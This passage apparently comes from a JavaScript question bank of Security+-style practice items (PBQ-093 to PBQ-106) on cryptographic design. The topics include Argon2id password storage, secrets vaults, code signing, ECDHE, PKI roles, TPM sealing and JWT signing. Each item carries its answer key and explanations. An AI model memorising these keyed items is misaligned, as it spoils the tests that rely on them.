        explain: "TLS_RSA_WITH_AES_128_CBC_SHA uses static RSA key exchange (no forward secrecy), a CBC mode, and SHA-1 MAC -- all weaknesses. CHACHA20_POLY1305 and AES_128_GCM are valid modern AEAD suites."
      }
    ],
    summary: "Enforce TLS 1.3 with AEAD/PFS suites and HSTS; strip static-RSA CBC SHA-1 legacy suites."
  },
  {
    id: "PBQ-093",
    format: 4,
    domain: 1,
    title: "Password Storage for a Web Authentication Service",
    brief: "Re-engineer how the identity service stores user passwords. The scheme must be a slow, salted, memory-hard function resistant to GPU and ASIC cracking.",
    exhibitTitle: "auth-hash.yaml",
    exhibit: "[ CREDENTIAL STORAGE ]\noperation ... store + verify user passwords\nrequire ..... per-user random salt, deliberate slowness\nresist ...... GPU/ASIC offline cracking, rainbow tables\ntuning ...... <span class='cy'>memory cost, time cost, parallelism configurable</span>\n<span class='hl'>CURRENT (insecure): unsalted MD5(password)</span>\n<span class='warnc'>do NOT use fast general-purpose hashes</span>",
    fields: [
      {
        label: "Password hashing function",
        hint: "Modern memory-hard KDF, PHC winner",
        options: ["Argon2id", "MD5", "SHA-256", "CRC32"],
        answer: 0,
        explain: "Argon2id (Password Hashing Competition winner) is a memory-hard KDF with tunable time/memory/parallelism, ideal for resisting GPU/ASIC cracking. MD5/SHA-256 are fast general-purpose hashes; CRC32 is a checksum, not a hash for secrets."
      },
      {
        label: "Mandatory per-credential addition",
        hint: "Defeats rainbow tables / identical passwords",
        options: ["A unique random salt per user", "A shared global pepper only", "A fixed prefix string", "No salt -- the hash is enough"],
        answer: 0,
        explain: "A unique per-user random salt ensures identical passwords produce different hashes and defeats precomputed rainbow tables. A pepper can be added on top, but a per-user salt is the non-negotiable requirement."
      },
      {
        label: "Acceptable alternative if Argon2 is unavailable",
        hint: "Adaptive, work-factor-based legacy-but-OK choices",
        options: ["bcrypt or scrypt", "SHA-1 with salt", "3DES of the password", "Base64 encoding"],
        answer: 0,
        explain: "bcrypt and scrypt are adaptive password hashing functions with work factors and are accepted fallbacks. Salted SHA-1 is still too fast; 3DES is encryption (reversible); Base64 is encoding, not protection."
      },
      {
        label: "What is WRONG with the current scheme?",
        hint: "Read the CURRENT line",
        options: ["MD5 is fast and unsalted -- trivially cracked", "MD5 is too slow for login", "MD5 produces too long a digest", "Nothing -- MD5 is collision resistant"],
        answer: 0,
        explain: "Unsalted MD5 is extremely fast and broken: rainbow tables and GPU rigs crack billions of MD5 hashes per second, and no salt means identical passwords collide. It must be replaced by a salted memory-hard KDF."
      }
    ],
    summary: "Store passwords with salted Argon2id (or bcrypt/scrypt); fast unsalted MD5/SHA hashing is unacceptable."
  },
  {
    id: "PBQ-094",
    format: 4,
    domain: 1,
    title: "Secret Management for Microservice API Keys",
    brief: "Dozens of microservices currently read database credentials and third-party API keys from plaintext environment files baked into container images. Design a secure secret-handling architecture.",
    exhibitTitle: "secrets-arch.txt",
    exhibit: "[ SECRET HANDLING REQUIREMENTS ]\nstore ....... centralized, encrypted, access-audited\nrotation .... <span class='ok'>automatic, short-lived dynamic credentials</span>\nkey backing . <span class='cy'>hardware-protected master key</span>\nauth ........ service identity, least privilege\n<span class='hl'>CURRENT: API keys committed in .env inside the image layer</span>\n<span class='dim'>secrets must never touch disk in plaintext</span>",
    fields: [
      {
        label: "Where should secrets live?",
        hint: "Purpose-built, audited, encrypted store",
        options: ["A centralized secrets vault (e.g., HashiCorp Vault)", "Hard-coded in the container image", "In a public Git repo with a private flag", "In a shared spreadsheet"],
        answer: 0,
        explain: "A dedicated secrets vault provides encryption at rest, fine-grained access policies, auditing, and dynamic/short-lived credentials. Baking secrets into images or repos exposes them to anyone who pulls the artifact."
      },
      {
        label: "Protection for the vault's master/root key",
        hint: "Hardware-protected line in the spec",
        options: ["Hardware Security Module (HSM)", "A text file on the app server", "An environment variable", "A printed sticky note"],
        answer: 0,
        explain: "An HSM is a tamper-resistant hardware device that generates and stores the master key so it never appears in plaintext memory or disk. Storing the root key in a file or env var defeats the purpose."
      },
      {
        label: "Best rotation strategy",
        hint: "Limit blast radius if a credential leaks",
        options: ["Automated rotation with short-lived dynamic credentials", "Rotate manually every few years", "Never rotate -- keys are random", "Rotate only after a confirmed breach"],
        answer: 0,
        explain: "Automatic rotation issuing short-lived, dynamically generated credentials minimizes the window a leaked secret is useful. Manual or breach-only rotation leaves long-lived static keys exposed indefinitely."
      },
      {
        label: "For signing webhooks between services, choose:",
        hint: "Symmetric shared-secret message authentication",
        options: ["HMAC-SHA256 with a shared secret", "Plain SHA-256 of the body", "MD5 of the body", "Base64 of the payload"],
        answer: 0,
        explain: "HMAC-SHA256 keys the hash with a shared secret so a recipient can verify both integrity and authenticity. A bare SHA-256/MD5 digest can be recomputed by anyone; Base64 provides no protection at all."
      }
    ],
    summary: "Centralize secrets in an HSM-backed vault with automatic short-lived rotation; authenticate webhooks with HMAC-SHA256."
  },
  {
    id: "PBQ-095",
    format: 4,
    domain: 1,
    title: "Code-Signing and Software Integrity",
    brief: "A software vendor must digitally sign release artifacts so customers can verify authenticity and detect tampering. Select the asymmetric algorithm and hash for the signature.",
    exhibitTitle: "codesign.cfg",
    exhibit: "[ RELEASE SIGNING ]\ngoal ........ prove publisher identity + detect tampering\nproperties .. authenticity, integrity, non-repudiation\nsignature ... <span class='cy'>asymmetric, private key signs / public key verifies</span>\ndigest ...... collision-resistant, >=256-bit\n<span class='hl'>old pipeline signed with RSA-1024 + SHA-1</span>\n<span class='dim'>customers verify with embedded publisher cert</span>",
    fields: [
      {
        label: "Signing algorithm + key strength",
        hint: "Asymmetric, at least 3072-bit if RSA",
        options: ["RSA-3072 (or ECDSA P-256)", "RSA-512", "DES", "RC4"],
        answer: 0,
        explain: "Code signing requires an asymmetric algorithm; RSA-3072 (or ECDSA P-256) provides modern security strength (~128-bit). DES and RC4 are symmetric and broken; RSA-512 is trivially factorable."
      },
      {
        label: "Hash algorithm for the digest",
        hint: "Collision-resistant, SHA-2 family or better",
        options: ["SHA-256", "SHA-1", "MD5", "MD4"],
        answer: 0,
        explain: "SHA-256 is collision-resistant and the standard digest for signatures. SHA-1 has practical collisions (SHAttered) and MD5/MD4 are completely broken for integrity."
      },
      {
        label: "Which key signs, which verifies?",
        hint: "Sender uses one, everyone uses the other",
        options: ["Private key signs; public key verifies", "Public key signs; private key verifies", "The same symmetric key does both", "A salt signs; a hash verifies"],
        answer: 0,
        explain: "In digital signatures the publisher signs with its private key and anyone verifies with the corresponding public key, providing non-repudiation. Reversing the roles would expose the secret key."
      },
      {
        label: "What is WRONG with the old pipeline?",
        hint: "Read the old-pipeline line",
        options: ["RSA-1024 and SHA-1 are both deprecated/weak", "RSA-1024 is too strong and slow", "SHA-1 is fine but RSA must be symmetric", "Nothing -- RSA-1024 + SHA-1 is current"],
        answer: 0,
        explain: "RSA-1024 is below the recommended 3072-bit floor and SHA-1 is vulnerable to collisions, so a forged signature is feasible. Both must be upgraded to RSA-3072/ECDSA and SHA-256."
      }
    ],
    summary: "Sign releases with RSA-3072/ECDSA + SHA-256 using the private key; retire RSA-1024 and SHA-1."
  },
  {
    id: "PBQ-096",
    format: 4,
    domain: 1,
    title: "Forward-Secret Key Exchange for a VPN",
    brief: "Configure the key-agreement and session parameters for a site-to-site VPN so that compromise of a long-term key cannot decrypt previously captured traffic.",
    exhibitTitle: "vpn-ike.conf",
    exhibit: "[ KEY EXCHANGE POLICY ]\nrequirement . <span class='ok'>perfect forward secrecy</span>\nexchange .... ephemeral, per-session keys\ncurve ....... <span class='cy'>NIST P-256 / Curve25519</span>\nauth ........ certificate-based peer auth\n<span class='hl'>legacy tunnel used static RSA key transport (no PFS)</span>\n<span class='dim'>rekey interval = 1h</span>",
    fields: [
      {
        label: "Key-exchange method giving forward secrecy",
        hint: "Ephemeral Diffie-Hellman variant",
        options: ["ECDHE (Ephemeral Elliptic-Curve Diffie-Hellman)", "Static RSA key transport", "Plain RSA encryption of the key", "Pre-shared key reused forever"],
        answer: 0,
        explain: "ECDHE generates fresh ephemeral key pairs per session, so a future private-key compromise cannot decrypt past sessions -- the definition of perfect forward secrecy. Static RSA key transport reuses one key and loses PFS."
      },
      {
        label: "Security property this provides",
        hint: "Read the requirement line",
        options: ["Perfect forward secrecy (PFS)", "Non-repudiation", "Data masking", "Steganography"],
        answer: 0,
        explain: "Ephemeral key exchange delivers perfect forward secrecy: each session key is independent, so capturing traffic and later stealing a long-term key yields nothing. Non-repudiation is a signature property, unrelated here."
      },
      {
        label: "Curve / parameter strength",
        hint: "Read the curve line",
        options: ["Curve25519 or NIST P-256", "512-bit DH group", "768-bit DH group", "ECB-mode key"],
        answer: 0,
        explain: "Curve25519 and NIST P-256 provide ~128-bit security and are recommended for ECDHE. 512/768-bit DH groups are far too weak (Logjam), and ECB is a cipher mode, not a key-exchange parameter."
      },
      {
        label: "Why was the legacy tunnel weaker?",
        hint: "Read the legacy line",
        options: ["Static RSA transport gives no forward secrecy", "Static RSA is too computationally expensive", "RSA key transport rotates too often", "It had no weakness"],
        answer: 0,
        explain: "Static RSA key transport encrypts the session key under one long-term key; if that key is ever stolen, all recorded past sessions can be decrypted. Ephemeral DH eliminates that single point of retroactive failure."
      }
    ],
    summary: "Use ECDHE with Curve25519/P-256 for perfect forward secrecy; static RSA key transport offers none."
  },
  {
    id: "PBQ-097",
    format: 4,
    domain: 1,
    title: "PKI Roles and Certificate Lifecycle",
    brief: "An enterprise is standing up an internal PKI. Match each lifecycle function to the correct PKI component and revocation-checking method.",
    exhibitTitle: "pki-design.txt",
    exhibit: "[ INTERNAL PKI ROLES ]\nissues certs ......... <span class='cy'>trusted root / issuing authority</span>\nverifies identity .... vetting before issuance\nrequest format ....... contains public key + subject\nrevocation check ..... <span class='ok'>real-time, per-cert query</span>\n<span class='warnc'>private CA key MUST stay offline / HSM-protected</span>\n<span class='dim'>some keys backed up for recovery</span>",
    fields: [
      {
        label: "Component that issues and signs certificates",
        hint: "The root of trust",
        options: ["Certificate Authority (CA)", "Registration Authority (RA)", "Online Responder only", "End entity"],
        answer: 0,
        explain: "The CA is the trusted entity that signs and issues certificates, anchoring the chain of trust. The RA only handles identity vetting; it does not sign certificates."
      },
      {
        label: "Component that validates the requester's identity",
        hint: "Vetting, not signing",
        options: ["Registration Authority (RA)", "Certificate Authority (CA)", "CRL distribution point", "TPM"],
        answer: 0,
        explain: "The RA performs identity proofing and approves requests before forwarding them to the CA to sign. Offloading vetting to the RA lets the CA stay offline and protected."
      },
      {
        label: "What the client submits to request a cert",
        hint: "Carries the public key and subject info",
        options: ["Certificate Signing Request (CSR)", "Certificate Revocation List (CRL)", "OCSP response", "Key escrow ticket"],
        answer: 0,
        explain: "A CSR contains the applicant's public key and subject details, signed by the applicant's private key, and is what the CA signs to issue a certificate. A CRL/OCSP response relate to revocation, not issuance."
      },
      {
        label: "Real-time, per-certificate revocation check",
        hint: "Single-cert query vs a downloaded list",
        options: ["OCSP (Online Certificate Status Protocol)", "CRL full download", "Key escrow", "DNSSEC"],
        answer: 0,
        explain: "OCSP queries the status of a single certificate in real time, avoiding the latency of downloading an entire CRL. A CRL is a periodically published list; key escrow and DNSSEC are unrelated to revocation status."
      },
      {
        label: "Service that stores key copies for recovery",
        hint: "Read the backup line",
        options: ["Key escrow", "OCSP stapling", "Certificate pinning", "Salting"],
        answer: 0,
        explain: "Key escrow securely stores copies of private/encryption keys so data can be recovered if a key is lost. It must be tightly controlled because escrow weakens sole control of the key."
      }
    ],
    summary: "CA signs, RA vets, CSR requests, OCSP checks status in real time, and key escrow enables recovery."
  },
  {
    id: "PBQ-098",
    format: 4,
    domain: 1,
    title: "Choosing the Right Certificate Type",
    brief: "A company runs a primary site, many regional subdomains, and several distinct brand domains on one platform. Select certificate types that minimize cost while covering all hostnames.",
    exhibitTitle: "cert-requirements.txt",
    exhibit: "[ CERTIFICATE COVERAGE NEEDS ]\nA) <span class='cy'>app.example.com, mail.example.com, *.example.com</span>\nB) one cert covering example.com, example.net, brandx.io\nC) checkout page needs strongest browser identity bar\n<span class='warnc'>do NOT use a self-signed cert in production</span>\n<span class='dim'>all keys >=2048-bit RSA or P-256 ECC</span>",
    fields: [
      {
        label: "Cover every subdomain of one domain (A)",
        hint: "Single asterisk label",
        options: ["Wildcard certificate (*.example.com)", "Single-domain DV certificate", "Self-signed certificate", "Code-signing certificate"],
        answer: 0,
        explain: "A wildcard certificate secures all first-level subdomains of a single domain with one cert. A single-domain cert would need one per host, and code-signing certs are for software, not TLS."
      },
      {
        label: "One cert spanning multiple different domains (B)",
        hint: "Subject Alternative Name list",
        options: ["SAN / multi-domain (UCC) certificate", "Wildcard certificate", "Wildcard of a single domain", "EV certificate for one domain only"],
        answer: 0,
        explain: "A SAN (multi-domain/UCC) certificate lists several distinct domains in the Subject Alternative Name field. A wildcard only covers subdomains of one base domain, so it cannot span example.net and brandx.io."
      },
      {
        label: "Strongest organizational identity assurance (C)",
        hint: "Highest vetting level",
        options: ["Extended Validation (EV) certificate", "Domain Validation (DV) certificate", "Self-signed certificate", "Wildcard certificate"],
        answer: 0,
        explain: "EV certificates require rigorous organization vetting and signal the highest identity assurance. DV only proves domain control; self-signed certs are untrusted by browsers."
      },
      {
        label: "What is WRONG with using self-signed in prod?",
        hint: "Read the warning line",
        options: ["No trusted CA chain -- browsers warn/reject", "It is too strongly trusted", "It cannot use RSA keys", "Nothing -- self-signed is fine publicly"],
        answer: 0,
        explain: "A self-signed certificate is not chained to a trusted root CA, so public browsers display warnings and clients cannot validate it, breaking trust. It is acceptable only for internal testing."
      }
    ],
    summary: "Wildcard for subdomains, SAN for multiple domains, EV for top identity assurance; never self-sign in production."
  },
  {
    id: "PBQ-099",
    format: 4,
    domain: 1,
    title: "Hardware Roots of Trust",
    brief: "A laptop fleet and a payment backend each need a hardware-anchored cryptographic component. Match the correct hardware root of trust to each use case.",
    exhibitTitle: "hardware-rot.txt",
    exhibit: "[ HARDWARE ROOT-OF-TRUST SELECTION ]\nUC1: per-laptop key storage + measured/secure boot\nUC2: <span class='cy'>high-volume bulk key generation for the payment HSM farm</span>\nUC3: isolated key handling on a mobile SoC\nrequire ..... <span class='ok'>keys never leave the hardware boundary</span>\n<span class='warnc'>do NOT store master keys in plain OS files</span>",
    fields: [
      {
        label: "UC1: per-device key storage + secure boot",
        hint: "Soldered chip on the motherboard",
        options: ["TPM (Trusted Platform Module)", "HSM appliance", "USB flash drive", "Software keyring file"],
        answer: 0,
        explain: "A TPM is a motherboard chip that stores device keys, supports measured/secure boot via PCRs, and binds secrets to platform state. An HSM is overkill/wrong form factor for per-laptop boot integrity."
      },
      {
        label: "UC2: high-assurance bulk key generation",
        hint: "Dedicated tamper-resistant appliance",
        options: ["HSM (Hardware Security Module)", "TPM", "Secure enclave", "BIOS password"],
        answer: 0,
        explain: "An HSM is a dedicated, tamper-resistant, often FIPS 140-3 validated appliance built for high-volume key generation and cryptographic operations. A TPM is fixed to one host and not designed for farm-scale throughput."
      },
      {
        label: "UC3: isolated key handling inside a phone SoC",
        hint: "On-die protected execution region",
        options: ["Secure enclave / TrustZone", "External HSM", "Cloud KMS only", "Plain RAM"],
        answer: 0,
        explain: "A secure enclave (or TrustZone TEE) is an isolated region of the mobile SoC that handles keys and biometrics separately from the main OS. An external HSM is impractical inside a phone."
      },
      {
        label: "Common security guarantee of all three",
        hint: "Read the require line",
        options: ["Private keys never leave the hardware boundary", "Keys are exported to disk for backup", "Keys are printed for recovery", "Keys are shared over email"],
        answer: 0,
        explain: "TPMs, HSMs, and secure enclaves all keep private keys inside the tamper-resistant boundary and perform operations internally, so the key material is never exposed in plaintext. Exporting keys to disk defeats the root of trust."
      }
    ],
    summary: "TPM anchors per-device boot, HSM generates keys at scale, secure enclave isolates mobile keys -- all keep keys inside hardware."
  },
  {
    id: "PBQ-100",
    format: 4,
    domain: 1,
    title: "Transparent Data Encryption for a Data Warehouse",
    brief: "A data warehouse must be encrypted at the storage layer so that stolen backups or disks are unreadable, with no changes to application queries. Select the encryption approach and key hierarchy.",
    exhibitTitle: "tde-config.txt",
    exhibit: "[ STORAGE-LAYER ENCRYPTION ]\nscope ....... entire database files + backups\ntransparency  <span class='ok'>no query/app changes</span>\nkey model ... <span class='cy'>DEK encrypts data; KEK/master encrypts the DEK</span>\nmaster key .. external KMS / HSM, rotatable\n<span class='hl'>legacy: DEK stored in plaintext next to the data files</span>",
    fields: [
      {
        label: "Encryption approach for the requirement",
        hint: "Engine-level, transparent to apps",
        options: ["Transparent Data Encryption (TDE)", "Manual per-column app encryption", "Client-side field encryption", "No encryption, rely on firewall"],
        answer: 0,
        explain: "TDE encrypts data and log files at the storage engine level transparently to applications, protecting backups and stolen disks. Column/client-side encryption would require app changes, violating the transparency requirement."
      },
      {
        label: "Data-encryption-key (DEK) algorithm",
        hint: "FIPS block cipher, AEAD mode",
        options: ["AES-256-GCM", "DES-CBC", "RC4", "ROT13"],
        answer: 0,
        explain: "AES-256-GCM provides strong confidentiality plus integrity for the bulk data. DES and RC4 are broken; ROT13 is a trivial substitution and not encryption."
      },
      {
        label: "How the DEK should be protected",
        hint: "Read the key-model line",
        options: ["Encrypted by a KEK/master key in an HSM/KMS", "Stored in plaintext beside the data", "Hard-coded in the app binary", "Emailed to the DBA"],
        answer: 0,
        explain: "Envelope encryption wraps the DEK with a Key-Encryption-Key (master key) held in an HSM/KMS, so rotating or revoking the master key controls access without re-encrypting all data. Plaintext DEK storage offers no protection."
      },
      {
        label: "What is WRONG in the legacy setup?",
        hint: "Read the legacy line",
        options: ["Plaintext DEK beside data defeats the encryption", "The DEK is rotated too frequently", "TDE cannot use AES at all", "Nothing -- a local plaintext DEK is fine"],
        answer: 0,
        explain: "If the DEK sits in plaintext next to the data files, anyone who steals the files also steals the key, nullifying the encryption. The DEK must be wrapped by an HSM/KMS-held master key."
      }
    ],
    summary: "TDE with AES-256-GCM and an HSM/KMS-wrapped DEK protects warehouse files transparently; never store the DEK in plaintext."
  },
  {
    id: "PBQ-101",
    format: 4,
    domain: 1,
    title: "Mutual TLS for Service-to-Service Auth",
    brief: "Internal microservices must authenticate each other cryptographically, not just the server to the client. Configure mutual TLS with certificate-based identity.",
    exhibitTitle: "mtls-policy.txt",
    exhibit: "[ SERVICE MESH mTLS ]\nrequirement . <span class='ok'>both peers present + verify certificates</span>\nidentity .... short-lived service certs from internal CA\nprotocol .... TLS 1.3, AEAD suites\nverify ...... full chain to internal root, check SAN\n<span class='hl'>current: server-only TLS, clients unauthenticated</span>\n<span class='dim'>certs auto-rotated hourly by the mesh</span>",
    fields: [
      {
        label: "Authentication model required",
        hint: "Both ends prove identity",
        options: ["Mutual TLS (mTLS) -- client + server certs", "Server-only TLS", "Anonymous TLS", "Plain HTTP with an API key"],
        answer: 0,
        explain: "mTLS has both the client and server present and validate X.509 certificates, giving cryptographic identity to each peer. Server-only TLS leaves the client unauthenticated at the transport layer."
      },
      {
        label: "Protocol version + suite class",
        hint: "Latest TLS, authenticated encryption",
        options: ["TLS 1.3 with AEAD suites", "TLS 1.0 with RC4", "SSLv3 with 3DES", "TLS 1.1 with CBC"],
        answer: 0,
        explain: "TLS 1.3 with AEAD cipher suites is the modern secure baseline with mandatory forward secrecy. RC4, SSLv3, and CBC-based legacy suites are deprecated and vulnerable."
      },
      {
        label: "How each service proves identity",
        hint: "Read the identity line",
        options: ["Short-lived X.509 certs issued by the internal CA", "A shared static password", "Source IP allow-listing only", "A reused symmetric API key"],
        answer: 0,
        explain: "Short-lived certificates issued by the internal CA bind a verifiable identity to each service and limit exposure if one leaks. IP allow-lists and static passwords are spoofable and not cryptographic identity."
      },
      {
        label: "What is WRONG with the current setup?",
        hint: "Read the current line",
        options: ["Clients are unauthenticated -- only the server proves identity", "Both ends authenticate twice", "Certs rotate too often to be safe", "Nothing -- server-only TLS is mutual"],
        answer: 0,
        explain: "With server-only TLS the client never proves who it is, so any process that can reach the endpoint is trusted. mTLS closes that gap by requiring client certificates as well."
      }
    ],
    summary: "Use mTLS over TLS 1.3 with short-lived internal-CA certificates so both peers authenticate cryptographically."
  },
  {
    id: "PBQ-102",
    format: 4,
    domain: 1,
    title: "Encrypting Backups Sent to Cloud Storage",
    brief: "Nightly backups are uploaded to a third-party object store. They must be encrypted before leaving the premises so the cloud provider never sees plaintext, with keys the customer controls.",
    exhibitTitle: "backup-crypto.txt",
    exhibit: "[ OFFSITE BACKUP ENCRYPTION ]\nmodel ....... <span class='ok'>client-side encryption before upload</span>\nkey control . <span class='cy'>customer-managed keys, provider has no access</span>\nalgorithm ... AES-256, authenticated mode\nintegrity ... detect tampering on restore\n<span class='hl'>vendor default only encrypts server-side with provider keys</span>",
    fields: [
      {
        label: "Encryption placement that hides plaintext from the provider",
        hint: "Encrypt where, relative to upload?",
        options: ["Client-side (before upload)", "Server-side with provider keys", "At the provider's discretion", "Only in transit via TLS"],
        answer: 0,
        explain: "Client-side encryption performed before upload means the provider only ever stores ciphertext, so even provider staff cannot read the data. Server-side provider-key encryption leaves the provider able to decrypt."
      },
      {
        label: "Algorithm + mode for the backups",
        hint: "FIPS cipher with an integrity tag",
        options: ["AES-256-GCM", "AES-128-ECB", "RC4", "3DES-CBC"],
        answer: 0,
        explain: "AES-256-GCM gives strong confidentiality and an authentication tag to detect tampering on restore. ECB leaks patterns, RC4 is broken, and 3DES is deprecated."
      },
      {
        label: "Who should hold the keys?",
        hint: "Read the key-control line",
        options: ["The customer (customer-managed keys)", "The cloud provider exclusively", "Anyone with the bucket URL", "No one -- keys are unnecessary"],
        answer: 0,
        explain: "Customer-managed keys (CMK) keep control of decryption with the customer, so a provider compromise or subpoena cannot expose plaintext. Provider-held keys reintroduce provider access to data."
      },
      {
        label: "Why is the vendor default insufficient here?",
        hint: "Read the highlighted line",
        options: ["Provider-key server-side encryption lets the provider read data", "Server-side encryption is too strong", "It encrypts twice and corrupts data", "Nothing -- it meets the requirement"],
        answer: 0,
        explain: "Server-side encryption with provider-managed keys protects against disk theft but not against the provider itself, failing the 'provider never sees plaintext' requirement. Client-side CMK encryption is needed."
      }
    ],
    summary: "Client-side AES-256-GCM with customer-managed keys keeps backups unreadable to the cloud provider."
  },
  {
    id: "PBQ-103",
    format: 4,
    domain: 1,
    title: "JWT Signing for a Stateless API",
    brief: "An API issues JSON Web Tokens for authentication across many resource servers. Choose a signing scheme where resource servers can verify tokens without holding the signing secret.",
    exhibitTitle: "jwt-signing.txt",
    exhibit: "[ TOKEN SIGNING DESIGN ]\nissuer ...... single auth server\nverifiers ... many independent resource servers\nrequire ..... <span class='ok'>verifiers cannot mint tokens</span>\nkey type .... <span class='cy'>asymmetric: sign with private, verify with public</span>\n<span class='hl'>current: HS256 shared secret copied to every service</span>\n<span class='warnc'>reject the 'alg:none' token trick</span>",
    fields: [
      {
        label: "Signature algorithm that fits the trust model",
        hint: "Asymmetric so verifiers hold only public key",
        options: ["RS256 / ES256 (asymmetric)", "HS256 (shared HMAC secret)", "No signature (alg:none)", "MD5 of the payload"],
        answer: 0,
        explain: "RS256 (RSA) or ES256 (ECDSA) signs with the auth server's private key while resource servers verify with the public key, so a leaked verifier key cannot mint tokens. HS256 forces sharing the secret with every verifier."
      },
      {
        label: "Hash strength inside the signature",
        hint: "SHA-2 family, 256-bit",
        options: ["SHA-256", "SHA-1", "MD5", "CRC32"],
        answer: 0,
        explain: "SHA-256 (the '256' in RS256/ES256) is the collision-resistant digest used in the signature. SHA-1 and MD5 are broken, and CRC32 is a checksum, not a secure hash."
      },
      {
        label: "Why is the current HS256 design risky?",
        hint: "Read the current line",
        options: ["The shared secret on every service can forge tokens", "HS256 is too slow for APIs", "HS256 cannot encode JSON", "Nothing -- sharing the secret is fine"],
        answer: 0,
        explain: "With HS256 the same secret both signs and verifies, so any compromised resource server can forge valid tokens. Asymmetric signing removes the signing capability from verifiers."
      },
      {
        label: "Which token must always be rejected?",
        hint: "Read the warning line",
        options: ["A token with 'alg':'none' (unsigned)", "A token signed with ES256", "A token with a valid RS256 signature", "A token with a short expiry"],
        answer: 0,
        explain: "The 'alg:none' value declares the token unsigned; accepting it lets an attacker bypass verification entirely. Verifiers must pin the expected algorithm and reject none."
      }
    ],
    summary: "Sign JWTs with asymmetric RS256/ES256 so verifiers hold only public keys; reject alg:none and avoid shared-secret HS256."
  },
  {
    id: "PBQ-104",
    format: 4,
    domain: 1,
    title: "Full-Disk Encryption with TPM Binding",
    brief: "Corporate laptops must encrypt the entire system drive and unlock it only when booted with an unmodified, trusted boot chain. Select the encryption scope and hardware binding.",
    exhibitTitle: "fde-policy.txt",
    exhibit: "[ ENDPOINT DISK ENCRYPTION ]\nscope ....... <span class='ok'>entire OS volume incl. swap/hibernation</span>\nthreat ...... lost/stolen powered-off laptop\nkey release . <span class='cy'>bound to TPM measured boot (PCR sealing)</span>\nrecovery .... escrowed recovery key in MDM\n<span class='hl'>pilot used a 4-digit PIN with no TPM sealing</span>",
    fields: [
      {
        label: "Encryption scope for this threat",
        hint: "Read the scope line",
        options: ["Full-disk encryption of the whole OS volume", "Single-folder encryption only", "Just the documents directory", "No encryption -- BIOS password suffices"],
        answer: 0,
        explain: "Full-disk encryption protects the entire volume (including swap and hibernation files) so a stolen powered-off device reveals nothing. Folder-only encryption leaves temp files and swap exposed."
      },
      {
        label: "Cipher for the volume",
        hint: "Modern FDE cipher (e.g., BitLocker/LUKS default)",
        options: ["AES-256 (XTS mode)", "RC4", "DES", "ECB-mode AES"],
        answer: 0,
        explain: "AES-256 in XTS mode is the standard for full-disk encryption (used by BitLocker and LUKS). RC4/DES are broken, and ECB is unsuitable for disk sectors because it leaks structure."
      },
      {
        label: "Hardware that releases the key only on trusted boot",
        hint: "Measured boot / PCR sealing",
        options: ["TPM (sealed to PCR measurements)", "A USB hub", "The network card", "A printed recovery sheet"],
        answer: 0,
        explain: "The TPM seals the volume key to platform measurements (PCRs) and releases it only if the boot chain is unmodified, defeating offline tampering and evil-maid attacks. The other items provide no integrity binding."
      },
      {
        label: "What was WRONG with the pilot?",
        hint: "Read the pilot line",
        options: ["A 4-digit PIN with no TPM sealing is brute-forceable and unbound", "The PIN was too long to type", "TPM sealing made it too secure", "Nothing -- a PIN alone is sufficient"],
        answer: 0,
        explain: "A 4-digit PIN has trivial entropy and, without TPM sealing, the key is not bound to a trusted boot state, allowing offline attack. Binding to the TPM plus a stronger secret is required."
      }
    ],
    summary: "Use AES-256-XTS full-disk encryption with the volume key sealed to TPM measured boot, not a weak standalone PIN."
  },
  {
    id: "PBQ-105",
    format: 4,
    domain: 1,
    title: "Message Integrity vs Confidentiality Selection",
    brief: "A logging pipeline must guarantee that shipped log records were not altered in transit, and a separate config channel must guarantee both secrecy and tamper-detection. Match each control correctly.",
    exhibitTitle: "integrity-matrix.txt",
    exhibit: "[ CHANNEL SECURITY MATRIX ]\nCh-A logs .... integrity + authenticity, plaintext OK\nCh-B config .. <span class='ok'>confidentiality AND integrity together</span>\nshared key .. <span class='cy'>symmetric secret per channel</span>\n<span class='hl'>old design used plain SHA-256 (no key) for Ch-A -- forgeable</span>\n<span class='warnc'>do NOT confuse encoding with encryption</span>",
    fields: [
      {
        label: "Ch-A: keyed integrity + authenticity (plaintext allowed)",
        hint: "Keyed hash, not bare digest",
        options: ["HMAC-SHA256", "Plain SHA-256 (unkeyed)", "Base64 encoding", "CRC32 checksum"],
        answer: 0,
        explain: "HMAC-SHA256 keys the hash with a shared secret, so a tamperer who lacks the key cannot forge a valid tag -- providing integrity AND authenticity. A bare SHA-256 can be recomputed by anyone, and Base64/CRC give no security."
      },
      {
        label: "Ch-B: confidentiality AND integrity in one step",
        hint: "Authenticated encryption (AEAD)",
        options: ["AES-256-GCM (AEAD)", "AES-256-CBC with no MAC", "SHA-256 only", "Base64 then gzip"],
        answer: 0,
        explain: "AES-256-GCM is an AEAD cipher delivering both confidentiality and a built-in authentication tag. CBC alone provides no integrity, a hash alone provides no confidentiality, and Base64/gzip are not security controls."
      },
      {
        label: "Why was the old Ch-A design forgeable?",
        hint: "Read the old-design line",
        options: ["Plain SHA-256 has no key, so anyone can recompute it", "SHA-256 output is too short", "SHA-256 is encrypted, not hashed", "It was actually secure"],
        answer: 0,
        explain: "An unkeyed SHA-256 digest can be regenerated by any party who modifies the message, so it proves nothing about authenticity. A keyed MAC (HMAC) or a signature is required."
      },
      {
        label: "Common student error the warning calls out",
        hint: "Read the warning line",
        options: ["Treating encoding (Base64) as if it were encryption", "Using AES instead of DES", "Adding a salt to a hash", "Rotating keys too often"],
        answer: 0,
        explain: "Base64 is reversible encoding for transport, not encryption -- it provides zero confidentiality. Conflating the two is a classic mistake the spec explicitly warns against."
      }
    ],
    summary: "Use HMAC-SHA256 for keyed integrity and AES-256-GCM for combined confidentiality+integrity; unkeyed hashes and Base64 secure nothing."
  }
);
SECPLUS.pbqs.push(
  {
    id: "PBQ-106",
    format: 4,
    domain: 1,
    title: "Secure Email Encryption Architecture",
    brief: "An enterprise needs end-to-end encrypted and digitally signed email integrated with the existing PKI. Select the crypto components that align with the requirements.",
    exhibitTitle: "Email Security Requirements",
    exhibit: "<span class='dim'>-- Messaging Security Standard --</span>\nIntegration: <span class='cy'>existing enterprise X.509 PKI / CA</span>\nGoal: confidentiality + sender authentication + integrity\nClient base: Outlook / corporate MDM-managed devices\nKey escrow: <span class='ok'>required for compliance recovery</span>\nLegacy note: <span class='hl'>some users still request RC4-based encryption</span>",
    fields: [
      {
        label: "Email security standard (PKI-integrated)",
        hint: "Uses X.509 certs from the enterprise CA.",
        options: ["OpenPGP web-of-trust", "S/MIME", "Plain SMTP with STARTTLS only", "Proprietary RC4 mailer"],
        answer: 1,
